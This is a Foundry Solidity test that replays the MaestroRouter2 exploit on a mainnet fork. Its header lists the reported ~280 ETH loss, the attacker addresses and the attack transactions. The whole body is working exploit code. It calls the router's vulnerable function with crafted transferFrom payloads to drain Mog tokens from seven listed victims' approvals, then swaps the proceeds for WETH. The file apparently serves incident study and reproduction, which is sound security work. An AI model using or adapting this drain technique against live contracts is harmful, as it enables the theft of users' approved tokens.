// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~280 ETH
// Attacker : https://etherscan.io/address/0xce6397e53c13ff2903ffe8735e478d31e648a2c6
// Attack Contract : https://etherscan.io/address/0xe6c6e86e04de96c4e3a29ad480c94e7a471969ab
// Attacker Transaction :
// https://etherscan.io/tx/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92 14 ETH
// https://etherscan.io/tx/0xede874f9a4333a26e97d3be9d1951e6a3c2a8861e4e301787093cfb1293d4756 28.5 ETH
// https://etherscan.io/tx/0xe60c5a3154094828065049121e244dfd362606c2a5390d40715ba54699ba9da6 75 ETH
// https://etherscan.io/tx/0xf4ae22177c3abbb0f21defe51dd14eff68eb1b0c52ac4104186220138e8e5bb2 32.7 ETH
// https://etherscan.io/tx/0x6cba3a67d6b8de664d860b096c8c558a1d65e5fa9735c657ddc98f67969561a2 32.5 ETH
// https://etherscan.io/tx/0xddd1048fe3f2df1fb98e534a97173b32a9fca662dbd257a72725482431d3f25e 2 ETH
// https://etherscan.io/tx/0xffb4bd29825bdd41adf344028f759692021cbadc2d4cb5b587e68fd8285c5eb1 41 ETH
// https://etherscan.io/tx/0xa9948c8f0500a867091a090d12125f88868ac29e52af6391569094e82d416904 2 ETH
// https://etherscan.io/tx/0xc49499325cb5ad3bf4391ae95855ce2ee2b0222f9282c524daa1c4586a8fcd8b 13.4 ETH
// https://etherscan.io/tx/0xcfe1d2b333e1b9da5e2d5f1d7697b628c818cc41f9f3020187d4ce2c2610a05c 7.5 ETH
// https://etherscan.io/tx/0x33f6adf410bbd0ae08b0cd44410de1e5b28e516434567113982fcac36ed9e1a4 4.7 ETH
// https://etherscan.io/tx/0x4f4d6909a442b4d86f79a9044dcada6a128ddd9f62c26f410134a72d2fc31389 16.7

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1717014871836098663
// https://twitter.com/BeosinAlert/status/1717013965203804457

interface IMaestroRouter {}

// The hacker sent multiple transactions to attack, just taking the first transaction as an example.

contract MaestroRouter2Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IMaestroRouter router = IMaestroRouter(0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e);
    address router_logic = 0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a;
    IERC20 Mog = IERC20(0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a);
    WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 UniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() public {
        cheats.createSelectFork("mainnet");

        cheats.label(address(router), "MaestroRouter2");
        cheats.label(address(router_logic), "MaestroRouter2 Logic Contract");
        cheats.label(address(Mog), "Mog Token");
        cheats.label(address(UniRouter), "UniswapRouterV2");
    }

    function testExploit() public {
        cheats.rollFork(18_423_219);
        emit log_named_decimal_uint("Attacker Mog balance before exploit", Mog.balanceOf(address(this)), Mog.decimals());

        address[] memory victims = new address[](7);
        victims[0] = 0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F;
        victims[1] = 0xD0b4EE02E9bA15b9dac916d2CCAbaD50F836B24D;
        victims[2] = 0xe84180bdc970c01B30a326f610F110acB23EcdBe;
        victims[3] = 0x6476425a65Ae09e22383B68416b32AbE62896aa9;
        victims[4] = 0x942beCA935703058E26527d0bD49D00E85841772;
        victims[5] = 0x968907878bDF60638FFdD5E4759289941333bf94;
        victims[6] = 0xA5162195e6CB7483eea8bA878d147b0E90519c64;
        bytes4 vulnFunctionSignature = hex"9239127f";
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 allowance = Mog.allowance(victims[i], address(router));
            uint256 balance = Mog.balanceOf(victims[i]);
            balance = allowance < balance ? allowance : balance;
            bytes memory transferFromData =
                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), balance);
            bytes memory data = abi.encodeWithSelector(vulnFunctionSignature, Mog, transferFromData, uint8(0), false);
            (bool success,) = address(router).call(data);
        }
        uint256 MogBalance = Mog.balanceOf(address(this));
        emit log_named_decimal_uint("Attacker Mog balance after exploit", MogBalance, Mog.decimals());

        address[] memory path = new address[](2);
        path[0] = address(Mog);
        path[1] = address(WETH);
        Mog.approve(address(UniRouter), MogBalance);
        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MogBalance, 0, path, address(this), block.timestamp
        );
        emit log_named_decimal_uint("Attacker ETH balance after exploit", WETH.balanceOf(address(this)), 18);
    }
}
